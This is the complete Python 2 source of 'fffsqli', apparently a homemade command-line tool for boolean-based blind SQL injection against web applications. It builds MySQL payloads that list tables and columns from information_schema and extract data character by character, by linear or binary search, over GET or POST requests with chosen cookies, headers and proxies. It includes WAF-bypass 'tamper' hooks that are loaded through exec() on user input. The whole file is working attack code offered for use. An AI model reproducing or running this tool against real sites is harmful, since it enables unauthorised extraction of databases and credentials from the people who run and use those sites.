#!/usr/bin/env python
# -*- coding: UTF-8 -*-
__author__ = 'Deen'

import sys, requests, re, argparse
from binascii import b2a_hex as hex

DATAS = ''


def color_print(color, text):
    color_end = '\033[0m'

    if color.lower() == "r" or color.lower() == "red":
        red = '\033[91m'
        text = red + text + color_end

    elif color.lower() == "lgray":
        gray = '\033[2m'
        text = gray + text + color_end

    elif color.lower() == "strike":
        strike = '\033[9m'
        text = strike + text + color_end

    elif color.lower() == "underline":
        underline = '\033[4m'
        text = underline + text + color_end
    elif color.lower() == "b" or color.lower() == "blue":
        blue = '\033[94m'
        text = blue + text + color_end

    elif color.lower() == "g" or color.lower() == "green":
        green = '\033[92m'
        text = green + text + color_end

    elif color.lower() == "y" or color.lower() == "yellow":
        yellow = "\033[93m"
        text = yellow + text + color_end

    elif color.lower() == "p" or color.lower() == "perse":
        perse = "\033[95m"
        text = perse + text + color_end

    else:
        return text

    return text


def parse_arguments():
    parser = argparse.ArgumentParser(description="")

    parser.add_argument('-u', '--url', help='target url')

    parser.add_argument('--data', help='When Http method is POST, e.g. username=admin&pass=admin')

    parser.add_argument('--bypass', help='To bypass WAF, e.g. and_replace;or_replace;')

    parser.add_argument('-k', '--keywords', help='Key words to judge between True and False')

    parser.add_argument('-T', '--table', help='To choose a table to query')

    parser.add_argument('-C', '--col', help='To choose a column to query')

    parser.add_argument('--proxy', help='Proxy, e.g. http://127.0.0.1:8080')

    parser.add_argument('--cookies', help='Cookie, e.g. PHPSESSID=XXXXX;token=xxxxx', default='')

    parser.add_argument('--prefix', help='Prefix, to make full_url', default='')

    parser.add_argument('--suffix', help='Suffix, to make full_url', default='')

    parser.add_argument('-tables', '--tables', help='To get all tables')

    parser.add_argument('--columns', help='Input the table_name to get all columns, e.g. users')

    parser.add_argument('-v', help='To choose if to show payloads', default=0, type=int)

    parser.add_argument('--length', help='The length of the DATAS you get', default=32, type=int)

    parser.add_argument('--way', help='To choose whether to use binary search, default=0', default=0, type=int)

    parser.add_argument('--tamper', help='To bypass the WAF, e.g. space2comment,random')

    parser.add_argument('--sub',
                        help='To choose how to cut the string, e.g. value 0 => substr form, value 1 => mid from, value 2 => left right, value 3 => right lpad',
                        default=0, type=int)

    parser.add_argument('--headers', help="To modify the headers, e.g. Useraget=xxx;Content-type=xxx")

    args = parser.parse_args()

    return args


def banner():
    banner = '''
    ###########################################################################
    #                                                                         #
    #        ███████╗███████╗███████╗    ███████╗ ██████╗ ██╗     ██╗         #
    #        ██╔════╝██╔════╝██╔════╝    ██╔════╝██╔═══██╗██║     ██║         #
    #        █████╗  █████╗  █████╗█████╗███████╗██║   ██║██║     ██║         #
    #        ██╔══╝  ██╔══╝  ██╔══╝╚════╝╚════██║██║▄▄ ██║██║     ██║         #
    #        ██║     ██║     ██║         ███████║╚██████╔╝███████╗██║         #
    #        ╚═╝     ╚═╝     ╚═╝         ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝         #
    #                                                                         #
    #           \033[94m      --=[   Version 1.0 coded by Deen   ]=--    \033[0m\033[95m             #
    #                                                                         #
    ###########################################################################
'''

    return color_print('p', banner)


def judge(text, keywords):
    if keywords in text:
        return 1
    else:
        return 0


def get_length(payload):
    payload = "length(%s)" % (payload)
    return payload


def select_db():
    payload = "database()"
    return payload


def select_all_tables():
    payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
    return payload


def select_all_columns(table_name):
    table_name = '0x' + str(hex(table_name))
    payload = "select group_concat(column_name) from information_schema.columns where table_name=%s" % (table_name)
    return payload


def select_data(column, table):
    payload = "select group_concat(%s) from %s" % (column, table)
    return payload


def cut_payload(data, start_num, nums):
    if nums == 0:
        payload = "ascii(substr((%s)from(%s)))" % (data, start_num)
    elif nums == 1:
        payload = "ascii(mid((%s)from(%s)))" % (data, start_num)
    elif nums == 2:
        payload = "ascii(right(left((%s),%s),1))" % (data, start_num)
    elif nums == 3:
        payload = "ascii(right(lpad((%s),%s,space(1)),1))" % (data, start_num)
    else:
        print color_print('r', " [ Error ] ") + color_print('lgray', "Check the sub you input,should between 0 and 3  ")
        print color_print('g', " [ Info ] ") + color_print('lgray', "The sub: " + str(nums))
        sys.exit(0)
    return payload


def last_payload(payload, ascii_num):
    payload = "((%s)=%s)" % (payload, str(ascii_num))
    return payload


def full_url_GET(url, prefix, suffix, payload):
    full_url = url + str(prefix) + payload + str(suffix)
    return full_url


def cookie_handle(cookies):
    try:
        keys = []
        values = []
        c1 = cookies.split(';')
        for i in c1:
            c2 = i.split('=')
            keys.append(c2[0])
            values.append(c2[1])
        cookie = dict(zip(keys, values))
        return cookie
    except:
        print color_print('r', " [ Error ] ") + color_print('lgray', "Cookies handle error,check the cookies ")
        print color_print('r', " [ Error ] ") + color_print('b', "The cookies input: ") + color_print('lgray', cookies)
        sys.exit(0)

def headers_handler(headers):
    try:
        keys = []
        values = []
        c1 = headers.split(';')
        for i in c1:
            c2 = i.split('=')
            keys.append(c2[0])
            values.append(c2[1])
        header = dict(zip(keys, values))
        return header
    except:
        print color_print('r', " [ Error ] ") + color_print('lgray', "Headers handle error,check the headers ")
        print color_print('r', " [ Error ] ") + color_print('b', "The cookies input: ") + color_print('lgray', headers)
        sys.exit(0)


def data_handler(data, payload):
    try:
        keys = []
        values = []
        c1 = data.split('&')
        for i in c1:
            c2 = i.split('=')
            keys.append(c2[0])
            try:
                values.append(c2[1].replace('*', payload))
            except:
                pass
        datas = dict(zip(keys, values))
        return datas
    except:
        print color_print('r', " [ Error ] ") + color_print('lgray', "Data handle error,check the data ")
        print color_print('r', " [ Error ] ") + color_print('b', "The cookies input: ") + color_print('lgray', data)
        sys.exit(0)


def GET_attack(full_url, cookie, proxy, headers=None):
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    cookies = cookie_handle(cookie)

    proxies = {"http": proxy, "https": proxy.replace('http', 'https'), }

    if headers is None:
        final_headers = default_headers
    else:
        final_headers = headers_handler(headers)

    try:
        response = requests.get(full_url, headers=final_headers, cookies=cookies, proxies=proxies)

    except KeyboardInterrupt:
        print color_print('r', " [ Error ] ") + color_print('lgray', "KeyboardInterrupt")
        sys.exit(0)

    except:
        print color_print('r', " [ Error ] ") + color_print('lgray',
                                                            "Request GET error, check the proxies, url and the cookie ")
        print color_print('r', " [ Error ] ") + color_print('b', "proxies: ") + color_print('lgray', proxy)
        print color_print('r', " [ Error ] ") + color_print('b', "url: ") + color_print('lgray', full_url)
        print color_print('r', " [ Error ] ") + color_print('b', "cookie: ") + color_print('lgray', cookie)
        sys.exit(0)
    html = response.text
    return html


def POST_attack(full_url, cookie, proxy, data, headers=None):
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    cookies = cookie_handle(cookie)

    proxies = {"http": proxy, "https": proxy.replace('http', 'https'), }

    if headers is None:
        final_headers = default_headers
    else:
        final_headers = headers_handler(headers)


    try:
        response = requests.post(full_url, data, headers=final_headers, cookies=cookies, proxies=proxies)

    except KeyboardInterrupt:
        print color_print('r', " [ Error ] ") + color_print('lgray', "KeyboardInterrupt")
        sys.exit(0)

    except:
        print color_print('r', " [ Error ] ") + color_print('lgray',
                                                            "Request POST error, check the proxies, url and the cookie ")
        print color_print('r', " [ Error ] ") + color_print('b', "data: ") + color_print('lgray', data)
        print color_print('r', " [ Error ] ") + color_print('b', "proxies: ") + color_print('lgray', proxy)
        print color_print('r', " [ Error ] ") + color_print('b', "url: ") + color_print('lgray', full_url)
        print color_print('r', " [ Error ] ") + color_print('b', "cookie: ") + color_print('lgray', cookie)
        sys.exit(0)
    html = response.text
    return html




def exploit(target_url, prefix, suffix, table, column, tables, columns, keywords, v, length, way, cookies, tamper,
            proxies, sub, headers, data):
    global DATAS
    TAMPER = []
    if tamper:
        TAMPER = tamper.split(',')
    else:
        pass

    SELECT_DATAS = ""

    if tables:
        SELECT_DATAS = select_all_tables()
        # print SELECT_DATAS

    elif columns:
        SELECT_DATAS = select_all_columns(columns)
        # print SELECT_DATAS

    elif table and column:
        SELECT_DATAS = select_data(column, table)
        # print SELECT_DATAS
    else:
        pass

    print color_print('g', " [ Info ] ") + color_print('b', "The datas you query: ") + color_print('lgray',
                                                                                                   SELECT_DATAS)

    payload = last_payload(cut_payload(SELECT_DATAS, 'length_position', sub), 'ascii_position')

    if TAMPER:
        for i in TAMPER:
            try:
                exec ('from tamper import ' + i)
                exec ('payload = ' + i + '.tamper(payload)')
            except:
                print color_print('r', " [ Error ] ") + color_print('lgray', "No tamper named " + i)
                sys.exit(0)
    else:
        pass
    # print payload


    payload = payload.replace('length_position', '{}')
    payload = payload.replace('ascii_position', '{}')

    # print color_print('g', " [ Info ] ") + color_print('b', "The payload: ") + color_print('lgray', payload)

    if way == 0:
        print color_print('g', " [ Info ] ") + color_print('b', "The payload: ") + color_print('lgray', payload)
        for length_position in range(1, length + 1):
            for ascii_position in range(32, 127):

                l_payload = payload.format(length_position, ascii_position)

                # payload = last_payload(cut_payload(SELECT_DATAS,str(length_position)),str(ascii_position))
                # print payload

                if data:
                    #data = data.replace('*', prefix + l_payload + suffix )
                    datas = data_handler(data, prefix + l_payload + suffix)

                    '''
                    for j in datas.values():
                        print j
                    '''
                    html = POST_attack(target_url,cookies, proxies, datas, headers)
                    flag = judge(html, keywords)

                else:
                    full_url = full_url_GET(target_url, prefix, suffix, l_payload)

                    if v:
                        info = color_print('g', " [ Payload ] ") + color_print('lgray', full_url)
                        print info
                    else:
                        pass
                    html = GET_attack(full_url, cookies, proxies, headers)

                    # print html
                    flag = judge(html, keywords)

                if flag:
                    DATAS += (chr(ascii_position))
                    output = color_print('g', " [ Datas ] ") + color_print('b', DATAS)
                    print output
                    break
                else:
                    pass
        return output

    # 使用二分法
    if way == 1:

        l_payload = payload.replace('={}', '<{}')
        print color_print('g', " [ Info ] ") + color_print('b', "The payload: ") + color_print('lgray', l_payload)

        for length_position in range(1, length + 1):
            start = 32
            end = 126
            mid = int((start + end) / 2)
            while (start < end):
                # print "mid: " + str(mid)
                # print "start: " + str(start)
                # print "end: " + str(end)

                if (end - start == 1):

                    s_payload = l_payload.format(length_position, end)

                    if data:
                        datas = data_handler(data, prefix + s_payload + suffix)

                        '''
                        for j in datas.values():
                            print j
                        '''
                        if v:
                            info = color_print('g', " [ Payload ] ") + color_print('lgray', s_payload)
                            print info
                        else:
                            pass

                        html = POST_attack(target_url, cookies, proxies, datas, headers)


                    else:
                        full_url = full_url_GET(target_url, prefix, suffix, s_payload)

                        if v:
                            info = color_print('g', " [ Payload ] ") + color_print('lgray', full_url)
                            print info
                        else:
                            pass
                        html = GET_attack(full_url, cookies, proxies, headers)

                        # print html
                    flag = judge(html, keywords)

                    if flag:
                        DATAS += (chr(start))
                        output = color_print('g', " [ Datas ] ") + color_print('b', DATAS)
                        print output
                        break

                    else:
                        DATAS += (chr(end))
                        output = color_print('g', " [ Datas ] ") + color_print('b', DATAS)
                        print output
                        break

                else:

                    # print "mid: " + str(mid)
                    # print "start: " + str(start)
                    # print "end: " + str(end)
                    # print l_payload
                    t_payload = l_payload.format(length_position, mid)
                    # print l_payload
                    if data:
                        datas = data_handler(data, prefix + t_payload + suffix)

                        '''
                        for j in datas.values():
                            print j
                        '''
                        if v:
                            info = color_print('g', " [ Payload ] ") + color_print('lgray', t_payload)
                            print info
                        else:
                            pass
                        html = POST_attack(target_url, cookies, proxies, datas, headers)


                    else:
                        full_url = full_url_GET(target_url, prefix, suffix, t_payload)

                        if v:
                            info = color_print('g', " [ Payload ] ") + color_print('lgray', full_url)
                            print info
                        else:
                            pass
                        html = GET_attack(full_url, cookies, proxies, headers)

                    # print html
                    flag = judge(html, keywords)
                    # print "flag: " + str(flag)

                    if flag == 1:
                        end = mid
                        mid = int((mid + start) / 2)

                    else:
                        start = mid
                        mid = int((end + mid) / 2)


                        # print "mid: " + str(mid)
                        # print "start: " + str(start)
                        # print "end: " + str(end)

        return output


if __name__ == '__main__':

    args = parse_arguments()

    target_url = args.url
    data = args.data
    bypass = args.bypass
    table = args.table
    column = args.col
    length = args.length
    keywords = args.keywords
    cookies = args.cookies
    prefix = args.prefix
    suffix = args.suffix
    tables = args.tables
    columns = args.columns
    v = args.v
    way = args.way
    tamper = args.tamper
    proxies = args.proxy
    sub = args.sub
    headers = args.headers

    print banner()
    print color_print('g', " [ Info ] ") + color_print('blue', "The fffsqli has start ...")

    if keywords is None:
        print color_print('r', " [ Error ] ") + color_print('lgray', "Keywords is required")
        sys.exit(0)
    else:
        pass

    try:
        flag = exploit(target_url, prefix, suffix, table, column, tables, columns, keywords, v, length, way, cookies,
                       tamper, proxies, sub, headers, data)

    except KeyboardInterrupt:
        print color_print('r', " [ Error ] ") + color_print('lgray', "KeyboardInterrupt")
        sys.exit(0)

    print flag
